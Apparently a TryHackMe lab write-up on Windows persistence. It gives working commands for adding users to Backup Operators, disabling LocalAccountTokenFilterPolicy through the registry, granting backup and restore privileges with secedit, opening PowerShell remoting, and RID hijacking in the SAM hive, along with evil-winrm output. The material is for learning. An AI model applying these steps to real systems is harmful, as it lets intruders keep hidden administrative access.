---
layout: default
title:  "Windows Persistance"
weight: 0
type: docs
---

## Assign Group Memberships

Hear we aim to assign groups to unprivi accounts to set our local persistance, example groups includes 

- Backup Operators Group
- Remote Management Users Group

We can add users to group using.

 ```
 net localgroup "Backup Operator" <user name> /add
 ``` 

This will allow us to access remotely without the need for administrative access every time we login.

But UAC has a feature named LocalAccountTokenFilterPolicy which strips any local account of its administrative privileges when logging in remotely.

This can be managed by disabling the feature using reg.

```
C:\Users\Administrator> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
The operation completed successfully.
```

## Special Privileges and Security Descriptors -- more stealthy one 

This is a more of a stealthy one where insted of adding users to groups we try to persist through editing **Windows security policies/databases** and setting **Security Descriptors** in our favor.

We can edit the Windows security policies by using **secedit**.

```
PS C:\> secedit /export /cfg config.inf
The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.
PS C:\> notepad.exe .\config.inf
PS C:\> notepad.exe .\config.inf
PS C:\> secedit /import /cfg .\config.inf /db config.sdb
PS C:\> secedit /configure /db .\config.sdb /cfg config.inf
The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.
```
![image](THM_persistant_secdiscri.png)

By granting our user Sebackup/restore privliges we can dump hashes but this doesn't solve the problem yet as its not accessable via evil-Winrm.

Lastly we need to grand our user to br remotely accessable which can be done via security descriptor.

```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
Launches a graphical security editor for PowerShell remoting permissions on the default session configuration as shown below.

![image](THM_persistant_secdiscri.png)

Now by giving our self privileges, we can access user by evil-winrm.

```
*Evil-WinRM* PS C:\flags> whoami
wpersistence\thmuser2

*Evil-WinRM* PS C:\flags> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\flags> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
*Evil-WinRM* PS C:\flags> 
```
You can see by above commands we are not in to any groups like Backup Operators and Remote Management.

## RID Hijacking

This method is consist of changing the RID of a user to and administrative account like to 500 where as the normal user have rid of >= 1000 this can be done via registry hives .

```
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```
Hear admin has the rid of 500 and we can assign it to any user like thmuser3. By navigating to ```HKLM\SAM\SAM\Domains\Account\Users```  where there will be a key for each user in the machine.

![image](win_admin_rid.png)

Notice the RID is stored using little-endian notation, so its bytes appear reversed.We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![image](win_rid_2.png)


